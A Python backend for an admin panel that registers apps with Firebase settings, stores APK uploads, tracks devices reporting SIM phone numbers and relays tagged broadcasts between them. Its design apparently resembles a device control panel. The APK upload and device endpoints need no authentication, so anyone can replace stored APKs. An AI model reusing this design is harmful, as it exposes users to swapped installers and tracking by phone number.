#!/usr/bin/env python3
"""
BERLIN X PANEL — Python backend + static server.

The backend stores only data explicitly submitted by a user.
It does not access another user's private Firebase data or credentials.
"""
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import hashlib, json, os, secrets, sqlite3, time

ROOT = Path(__file__).resolve().parent
DATA_DIR = Path(os.environ.get("DATA_DIR", str(ROOT / "data"))).expanduser()
APK_DIR = DATA_DIR / "apks"
DB_PATH = DATA_DIR / "panel.db"

HOST = os.environ.get("HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "10000"))
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
MAX_APK_MB = max(1, int(os.environ.get("MAX_APK_MB", "150")))
MAX_APK_BYTES = MAX_APK_MB * 1024 * 1024
SESSION_TTL = 12 * 60 * 60

DATA_DIR.mkdir(parents=True, exist_ok=True)
APK_DIR.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════
# DEVICES PAGE — HTML generated inside Python, no .html file needed
# ═══════════════════════════════════════════════════════════

def _esc(s):
    if s is None or s == "":
        return "—"
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))

def render_devices_html(devices):
    rows = ""
    for d in devices:
        online = bool(d.get("online"))
        status_txt = "● online" if online else "○ offline"
        status_color = "#5cb85c" if online else "#777"
        last6 = (d.get("device_id") or "")[-6:].upper() or "—"
        rows += f"""
        <tr>
          <td class="mono strong">{_esc(last6)}</td>
          <td style="color:{status_color};font-weight:600;">{status_txt}</td>
          <td class="mono">{_esc(d.get('sim1_number'))}</td>
          <td class="mono">{_esc(d.get('sim2_number'))}</td>
          <td><span class="pill">SIM{_esc(d.get('active_sim'))}</span></td>
          <td class="mono dim">{_esc(d.get('last_seen'))}</td>
        </tr>"""
    if not rows:
        rows = '<tr><td colspan="6" class="empty">No devices yet — waiting for heartbeat</td></tr>'
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Devices — BERLIN X PANEL</title>
<style>
  *{{box-sizing:border-box;}}
  body{{margin:0;padding:2rem;background:#0a0a0a;color:#e0e0e0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;}}
  .topbar{{display:flex;justify-content:space-between;align-items:flex-start;
    margin-bottom:1.5rem;gap:1rem;flex-wrap:wrap;}}
  h1{{font-size:1.5rem;margin:0 0 .35rem;color:#e8a06a;letter-spacing:-.01em;}}
  .sub{{font-size:.85rem;opacity:.55;}}
  .sub .live{{color:#5cb85c;margin-right:.35rem;}}
  .actions{{display:flex;gap:.5rem;align-items:center;}}
  .btn{{padding:.5rem 1rem;background:#c14a1a;color:#fff;border:0;border-radius:5px;
    cursor:pointer;font-size:.85rem;font-weight:600;transition:background .15s;}}
  .btn:hover{{background:#d55a2a;}}
  .btn.ghost{{background:#1a1a1a;color:#ccc;border:1px solid #333;}}
  .btn.ghost:hover{{background:#222;}}
  table{{width:100%;border-collapse:collapse;background:#121212;border-radius:8px;
    overflow:hidden;box-shadow:0 0 0 1px #222;}}
  th,td{{padding:.85rem 1rem;text-align:left;border-bottom:1px solid #1c1c1c;font-size:.9rem;}}
  th{{background:#181818;font-size:.75rem;text-transform:uppercase;letter-spacing:.06em;
    opacity:.65;font-weight:600;}}
  tr:last-child td{{border-bottom:none;}}
  tbody tr:hover td{{background:#161616;}}
  .mono{{font-family:"SF Mono",Menlo,Consolas,monospace;}}
  .strong{{color:#e8a06a;font-weight:600;letter-spacing:.02em;}}
  .dim{{opacity:.55;font-size:.8rem;}}
  .pill{{display:inline-block;padding:.15rem .55rem;background:#1e2a1e;color:#7dc87d;
    border-radius:999px;font-size:.75rem;font-weight:600;}}
  .empty{{text-align:center;padding:2.5rem;opacity:.5;font-style:italic;}}
  .status-bar{{margin-top:1rem;font-size:.8rem;opacity:.5;font-family:monospace;}}
  #err{{display:none;color:#ff6b6b;padding:.75rem 1rem;background:#1a0a0a;
    border:1px solid #3a1a1a;border-radius:5px;margin-bottom:1rem;}}
</style>
</head>
<body>
<div class="topbar">
  <div>
    <h1>Connected Devices</h1>
    <div class="sub"><span class="live">●</span><span id="count">{len(devices)}</span> device(s) — auto-refresh every 10s</div>
  </div>
  <div class="actions">
    <button class="btn ghost" onclick="location.href='/admin'">Admin Panel</button>
    <button class="btn" onclick="refresh()">Refresh Now</button>
  </div>
</div>
<div id="err"></div>
<table>
  <thead>
    <tr>
      <th>Device (last 6)</th>
      <th>Status</th>
      <th>SIM 1</th>
      <th>SIM 2</th>
      <th>Active</th>
      <th>Last Seen</th>
    </tr>
  </thead>
  <tbody id="tbody">{rows}</tbody>
</table>
<div class="status-bar" id="status">Last updated: just now</div>
<script>
async function refresh(){{
  try{{
    const r=await fetch('/api/devices',{{credentials:'same-origin',headers:{{'Accept':'application/json'}}}});
    if(!r.ok) throw new Error('HTTP '+r.status);
    const d=await r.json();
    if(!d.ok) throw new Error(d.error||'failed');
    render(d.devices);
    document.getElementById('err').style.display='none';
    document.getElementById('status').textContent='Last updated: '+new Date().toLocaleTimeString();
  }}catch(e){{
    const err=document.getElementById('err');
    err.textContent='⚠ '+e.message+' — retrying...';
    err.style.display='block';
  }}
}}
function esc(s){{if(s==null||s==='')return'—';return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}}
function render(list){{
  const tb=document.getElementById('tbody');
  document.getElementById('count').textContent=list.length;
  if(!list.length){{
    tb.innerHTML='<tr><td colspan="6" class="empty">No devices yet — waiting for heartbeat</td></tr>';
    return;
  }}
  tb.innerHTML=list.map(d=>{{
    const online=!!d.online;
    const last6=(d.device_id||'').slice(-6).toUpperCase()||'—';
    return `<tr>
      <td class="mono strong">${{esc(last6)}}</td>
      <td style="color:${{online?'#5cb85c':'#777'}};font-weight:600;">${{online?'● online':'○ offline'}}</td>
      <td class="mono">${{esc(d.sim1_number)}}</td>
      <td class="mono">${{esc(d.sim2_number)}}</td>
      <td><span class="pill">SIM${{esc(d.active_sim)}}</span></td>
      <td class="mono dim">${{esc(d.last_seen)}}</td>
    </tr>`;
  }}).join('');
}}
setInterval(refresh,10000);
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════

def get_db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    con.execute("""
      CREATE TABLE IF NOT EXISTS apps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        app_name TEXT NOT NULL,
        owner_name TEXT NOT NULL,
        owner_email TEXT NOT NULL,
        firebase_project_id TEXT,
        firebase_database_url TEXT,
        firebase_auth_domain TEXT,
        firebase_storage_bucket TEXT,
        firebase_messaging_sender_id TEXT,
        firebase_app_id TEXT,
        firebase_config_json TEXT,
        apk_original_name TEXT,
        apk_stored_name TEXT,
        apk_size INTEGER NOT NULL DEFAULT 0,
        apk_sha256 TEXT,
        created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
        status TEXT NOT NULL DEFAULT 'active'
      )
    """)
    con.execute("""
      CREATE TABLE IF NOT EXISTS devices (
        device_id TEXT PRIMARY KEY,
        number TEXT,
        sim1_number TEXT,
        sim2_number TEXT,
        active_sim INTEGER NOT NULL DEFAULT 1,
        firebase_url TEXT,
        last_seen TEXT,
        online INTEGER NOT NULL DEFAULT 0
      )
    """)
    con.execute("""
      CREATE TABLE IF NOT EXISTS broadcasts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender_device_id TEXT NOT NULL,
        sender_sim_slot INTEGER NOT NULL,
        tag TEXT NOT NULL,
        text TEXT NOT NULL,
        target_count INTEGER NOT NULL DEFAULT 0,
        created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
      )
    """)
    con.execute("CREATE INDEX IF NOT EXISTS idx_bc_created ON broadcasts(created_at DESC)")
    con.execute("CREATE INDEX IF NOT EXISTS idx_dev_seen ON devices(last_seen DESC)")
    con.commit()
    return con

get_db().close()

SESSIONS = {}
RATE = {}

def cleanup():
    now = time.time()
    for token, expires in list(SESSIONS.items()):
        if expires <= now:
            SESSIONS.pop(token, None)
    for ip, entries in list(RATE.items()):
        entries = [t for t in entries if now - t < 300]
        if entries:
            RATE[ip] = entries
        else:
            RATE.pop(ip, None)

def json_out(handler, payload, code=200, extra=None):
    data = json.dumps(payload, ensure_ascii=False).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(data)))
    if extra:
        for k, v in extra.items():
            handler.send_header(k, v)
    handler.end_headers()
    handler.wfile.write(data)

def html_out(handler, html_text, code=200):
    data = html_text.encode("utf-8")
    handler.send_response(code)
    handler.send_header("Content-Type", "text/html; charset=utf-8")
    handler.send_header("Content-Length", str(len(data)))
    handler.end_headers()
    handler.wfile.write(data)

def token_from_cookie(headers):
    for part in headers.get("Cookie", "").split(";"):
        part = part.strip()
        if part.startswith("admin_session="):
            return part.split("=", 1)[1]
    return None

def is_admin(headers):
    cleanup()
    token = token_from_cookie(headers)
    return bool(token and token in SESSIONS and SESSIONS[token] > time.time())

def require_admin(handler):
    if not is_admin(handler.headers):
        json_out(handler, {"ok": False, "error": "Admin authentication required."}, 401)
        return False
    return True

def safe_filename(value):
    name = Path(value or "app.apk").name
    name = "".join(c for c in name if c.isalnum() or c in "._- ")
    return (name.strip() or "app.apk")[:180]

def read_json(handler, max_bytes=100_000):
    try:
        length = int(handler.headers.get("Content-Length", "0"))
    except ValueError:
        return None, "Invalid Content-Length."
    if length > max_bytes:
        return None, "Request too large."
    try:
        return json.loads(handler.rfile.read(length) or b"{}"), None
    except Exception:
        return None, "Invalid JSON."

def field(obj, name, limit):
    return str(obj.get(name, "") or "").strip()[:limit]

class Handler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def end_headers(self):
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "same-origin")
        self.send_header("X-Frame-Options", "SAMEORIGIN")
        super().end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/health":
            return json_out(self, {"ok": True, "service": "berlin-x-panel"})

        if path == "/admin":
            self.path = "/admin.html"
            return super().do_GET()

        if path == "/api/apps":
            if not require_admin(self): return
            q = parse_qs(urlparse(self.path).query).get("q", [""])[0].strip()
            con = get_db()
            if q:
                like = f"%{q}%"
                rows = con.execute("""
                  SELECT * FROM apps
                  WHERE app_name LIKE ? OR owner_name LIKE ?
                     OR owner_email LIKE ? OR firebase_project_id LIKE ?
                  ORDER BY id DESC
                """, (like, like, like, like)).fetchall()
            else:
                rows = con.execute("SELECT * FROM apps ORDER BY id DESC").fetchall()
            con.close()
            return json_out(self, {"ok": True, "apps": [dict(r) for r in rows]})

        if path == "/api/admin/stats":
            if not require_admin(self): return
            con = get_db()
            total = con.execute("SELECT COUNT(*) FROM apps").fetchone()[0]
            with_apk = con.execute("SELECT COUNT(*) FROM apps WHERE apk_stored_name IS NOT NULL").fetchone()[0]
            total_bytes = con.execute("SELECT COALESCE(SUM(apk_size),0) FROM apps").fetchone()[0]
            con.close()
            return json_out(self, {"ok": True, "total": total, "with_apk": with_apk, "apk_bytes": total_bytes})

        # ── DEVICES: HTML for browser, JSON for API ──
        if path == "/api/devices":
            if not require_admin(self): return
            con = get_db()
            con.execute("""
              UPDATE devices SET online=0
              WHERE last_seen < datetime('now', '-90 seconds')
            """)
            con.commit()
            rows = con.execute("""
              SELECT device_id, number, sim1_number, sim2_number,
                     active_sim, firebase_url, last_seen, online
              FROM devices ORDER BY last_seen DESC
            """).fetchall()
            con.close()
            device_list = [dict(r) for r in rows]

            accept = self.headers.get("Accept", "")
            if "text/html" in accept:
                return html_out(self, render_devices_html(device_list))
            return json_out(self, {"ok": True, "devices": device_list})

        # ── BROADCASTS history (admin, JSON only) ──
        if path == "/api/broadcasts":
            if not require_admin(self): return
            con = get_db()
            rows = con.execute("""
              SELECT * FROM broadcasts ORDER BY id DESC LIMIT 100
            """).fetchall()
            con.close()
            return json_out(self, {"ok": True, "broadcasts": [dict(r) for r in rows]})

        if path.startswith("/api/apk/"):
            if not require_admin(self): return
            try: app_id = int(path.rsplit("/", 1)[1])
            except ValueError: return json_out(self, {"ok": False, "error": "Invalid id."}, 400)
            con = get_db()
            row = con.execute("SELECT * FROM apps WHERE id=?", (app_id,)).fetchone()
            con.close()
            if not row or not row["apk_stored_name"]:
                return json_out(self, {"ok": False, "error": "APK not found."}, 404)
            f = APK_DIR / row["apk_stored_name"]
            if not f.is_file(): return json_out(self, {"ok": False, "error": "APK file missing."}, 404)
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.android.package-archive")
            self.send_header("Content-Length", str(f.stat().st_size))
            self.send_header("Content-Disposition", f'attachment; filename="{safe_filename(row["apk_original_name"])}"')
            self.end_headers()
            with f.open("rb") as src:
                while chunk := src.read(1024 * 1024):
                    self.wfile.write(chunk)
            return

        return super().do_GET()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/admin/login":
            body, err = read_json(self, 16_384)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            if not ADMIN_PASSWORD:
                return json_out(self, {"ok": False, "error": "ADMIN_PASSWORD is not configured."}, 503)
            if secrets.compare_digest(str(body.get("username","")), ADMIN_USER) and secrets.compare_digest(str(body.get("password","")), ADMIN_PASSWORD):
                token = secrets.token_urlsafe(36)
                SESSIONS[token] = time.time() + SESSION_TTL
                return json_out(self, {"ok": True}, 200, {
                    "Set-Cookie": f"admin_session={token}; HttpOnly; SameSite=Strict; Path=/; Max-Age={SESSION_TTL}"
                })
            return json_out(self, {"ok": False, "error": "Invalid admin credentials."}, 401)

        if path == "/api/admin/logout":
            token = token_from_cookie(self.headers)
            if token: SESSIONS.pop(token, None)
            return json_out(self, {"ok": True}, 200, {
                "Set-Cookie": "admin_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0"
            })

        # ── DEVICE HEARTBEAT ──
        if path == "/api/device/heartbeat":
            body, err = read_json(self, 8_192)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            device_id = field(body, "device_id", 120)
            if not device_id:
                return json_out(self, {"ok": False, "error": "device_id required."}, 400)
            sim1 = field(body, "sim1_number", 30)
            sim2 = field(body, "sim2_number", 30)
            active_sim = 2 if body.get("active_sim") == 2 else 1
            fb_url = field(body, "firebase_url", 500)
            now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            con = get_db()
            con.execute("""
              INSERT INTO devices
                (device_id, number, sim1_number, sim2_number,
                 active_sim, firebase_url, last_seen, online)
              VALUES (?, ?, ?, ?, ?, ?, ?, 1)
              ON CONFLICT(device_id) DO UPDATE SET
                number=excluded.number,
                sim1_number=excluded.sim1_number,
                sim2_number=excluded.sim2_number,
                active_sim=excluded.active_sim,
                firebase_url=excluded.firebase_url,
                last_seen=excluded.last_seen,
                online=1
            """, (device_id, sim1 or sim2, sim1, sim2, active_sim, fb_url, now_iso))
            con.commit(); con.close()
            return json_out(self, {"ok": True, "server_time": now_iso})

        # ── BROADCAST ──
        if path == "/api/broadcast":
            body, err = read_json(self, 16_384)
            if err: return json_out(self, {"ok": False, "error": err}, 400)
            device_id = field(body, "device_id", 120)
            text = str(body.get("text", "") or "").strip()
            sim_slot = 2 if body.get("sim_slot") == 2 else 1
            if not device_id or not text:
                return json_out(self, {"ok": False, "error": "device_id and text required."}, 400)
            if len(text) > 1000:
                return json_out(self, {"ok": False, "error": "text too long (max 1000)."}, 413)

            last6 = device_id[-6:].upper()
            tag = f"{last6}-SIM{sim_slot}"
            full = f"{tag}: {text}"
            now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

            con = get_db()
            target_count = con.execute(
                "SELECT COUNT(*) FROM devices WHERE device_id != ? AND online = 1",
                (device_id,)
            ).fetchone()[0]
            cur = con.execute("""
              INSERT INTO broadcasts
                (sender_device_id, sender_sim_slot, tag, text, target_count, created_at)
              VALUES (?, ?, ?, ?, ?, ?)
            """, (device_id, sim_slot, tag, text, target_count, now_iso))
            con.commit()
            broadcast_id = cur.lastrowid
            con.close()
            return json_out(self, {
                "ok": True,
                "broadcast_id": broadcast_id,
                "tag": tag,
                "tagged_message": full,
                "target_count": target_count,
            }, 201)

        if path == "/api/apps":
            ip = self.client_address[0]
            now = time.time()
            entries = [t for t in RATE.get(ip, []) if now - t < 300]
            if len(entries) >= 5:
                return json_out(self, {"ok": False, "error": "Too many submissions. Try again later."}, 429)
            entries.append(now); RATE[ip] = entries

            if not self.headers.get("Content-Type", "").startswith("application/json"):
                return json_out(self, {"ok": False, "error": "Use application/json."}, 400)
            body, err = read_json(self, 100_000)
            if err: return json_out(self, {"ok": False, "error": err}, 400)

            app_name = field(body, "app_name", 120)
            owner_name = field(body, "owner_name", 120)
            owner_email = field(body, "owner_email", 180)
            if not app_name or not owner_name or not owner_email:
                return json_out(self, {"ok": False, "error": "App name, owner name and email are required."}, 400)

            con = get_db()
            cur = con.execute("""
              INSERT INTO apps (
                app_name, owner_name, owner_email, firebase_project_id,
                firebase_database_url, firebase_auth_domain, firebase_storage_bucket,
                firebase_messaging_sender_id, firebase_app_id, firebase_config_json
              ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                app_name, owner_name, owner_email,
                field(body,"firebase_project_id",180),
                field(body,"firebase_database_url",500),
                field(body,"firebase_auth_domain",300),
                field(body,"firebase_storage_bucket",300),
                field(body,"firebase_messaging_sender_id",120),
                field(body,"firebase_app_id",240),
                field(body,"firebase_config_json",10000)
            ))
            con.commit(); app_id = cur.lastrowid; con.close()
            return json_out(self, {"ok": True, "id": app_id}, 201)

        return json_out(self, {"ok": False, "error": "Not found."}, 404)

    def do_PUT(self):
        path = urlparse(self.path).path
        if not (path.startswith("/api/apps/") and path.endswith("/apk")):
            return json_out(self, {"ok": False, "error": "Not found."}, 404)

        try: app_id = int(path.split("/")[3])
        except Exception: return json_out(self, {"ok": False, "error": "Invalid app id."}, 400)

        try: length = int(self.headers.get("Content-Length", "0"))
        except ValueError: length = 0
        if length <= 0: return json_out(self, {"ok": False, "error": "Empty APK."}, 400)
        if length > MAX_APK_BYTES: return json_out(self, {"ok": False, "error": f"APK exceeds {MAX_APK_MB} MB."}, 413)

        original = safe_filename(self.headers.get("X-APK-Filename", "app.apk"))
        if not original.lower().endswith(".apk"):
            return json_out(self, {"ok": False, "error": "Only .apk files are accepted."}, 400)

        con = get_db()
        row = con.execute("SELECT apk_stored_name FROM apps WHERE id=?", (app_id,)).fetchone()
        if not row:
            con.close(); return json_out(self, {"ok": False, "error": "Registration not found."}, 404)

        stored = f"{int(time.time())}-{secrets.token_hex(8)}.apk"
        temp = APK_DIR / (".upload-" + secrets.token_hex(12))
        digest = hashlib.sha256()
        received = 0
        try:
            with temp.open("wb") as out:
                while received < length:
                    chunk = self.rfile.read(min(1024 * 1024, length - received))
                    if not chunk: raise IOError("incomplete upload")
                    received += len(chunk); digest.update(chunk); out.write(chunk)
            temp.replace(APK_DIR / stored)
            if row["apk_stored_name"]:
                (APK_DIR / row["apk_stored_name"]).unlink(missing_ok=True)
            con.execute("""
              UPDATE apps SET apk_original_name=?, apk_stored_name=?, apk_size=?, apk_sha256=?
              WHERE id=?
            """, (original, stored, received, digest.hexdigest(), app_id))
            con.commit(); con.close()
            return json_out(self, {"ok": True, "id": app_id, "sha256": digest.hexdigest(), "size": received})
        except Exception:
            temp.unlink(missing_ok=True)
            con.close()
            return json_out(self, {"ok": False, "error": "APK upload failed."}, 500)

    def do_DELETE(self):
        path = urlparse(self.path).path
        if not (path.startswith("/api/apps/") and path.endswith("/delete")):
            return json_out(self, {"ok": False, "error": "Not found."}, 404)
        if not require_admin(self): return
        try: app_id = int(path.split("/")[3])
        except Exception: return json_out(self, {"ok": False, "error": "Invalid id."}, 400)
        con = get_db()
        row = con.execute("SELECT apk_stored_name FROM apps WHERE id=?", (app_id,)).fetchone()
        if not row:
            con.close(); return json_out(self, {"ok": False, "error": "App not found."}, 404)
        if row["apk_stored_name"]: (APK_DIR / row["apk_stored_name"]).unlink(missing_ok=True)
        con.execute("DELETE FROM apps WHERE id=?", (app_id,))
        con.commit(); con.close()
        return json_out(self, {"ok": True})

if __name__ == "__main__":
    print(f"BERLIN X PANEL running at http://{HOST}:{PORT}")
    print(f"Admin: http://127.0.0.1:{PORT}/admin")
    print(f"Devices: http://127.0.0.1:{PORT}/api/devices")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
